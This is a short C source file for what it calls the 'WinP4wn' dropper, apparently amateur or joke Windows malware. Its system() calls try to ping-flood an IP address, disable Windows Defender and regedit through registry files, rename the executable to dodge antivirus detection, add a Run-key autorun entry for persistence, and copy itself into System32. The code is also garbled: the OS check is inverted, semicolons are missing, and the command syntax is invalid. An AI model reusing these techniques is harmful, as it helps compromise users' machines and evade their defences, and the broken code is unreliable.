#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

void getos() {
#ifndef __WIN32__
#define OS __WIN32__
  /** do a DOS Flood on the NSA Router */
  system("ping 208.88.84.0 -l 65500 -w 1 -n 1");
  /** disable some stuff like winfirewall and regedit */
  system("reg /s registries/disabledef.reg");
  system("reg /s registries/disablereg.reg");
  /** give it a hash instead of this win32 name cuz def will detect it then xDDD */
  system("ren Win32.WinP4wn.dropper.exe 27cacc006aaf5bdd2a8e6b9b94711548.exe")
  /** Using the sysreg command to import a registry hive with administrative settings xD */
  system("reg load HKLM/Software/WinP4ned 'NTUSER.DAT' /y [/c]")
  /** fetch latest gp changes from the local replication */
  system("gpupdate /force")
#else
#error "WinP4wn does only work on Windooze!"
#endif
}

void autorun() {
  /** mounting WinP4wn as autorun driver */
  system("reg add Computer/HKEY_LOCAL_MACHINE/SOFTWARE/Microsoft/Windows/CurrentVersion/Run/WinP4wned /v GetP4wned /t REG_EXPAND_SZ /d %Temp%/WinP4wn/27cacc006aaf5bdd2a8e6b9b94711548.exe");
}

void aftereffect() {
  system("move %Temp%/winp4wn/27cacc006aaf5bdd2a8e6b9b94711548.exe C:/Windows/System32");
}

int main(int argc, char* argv[]) {
  getos();
  autorun();
  aftereffect();
  return 0;
}
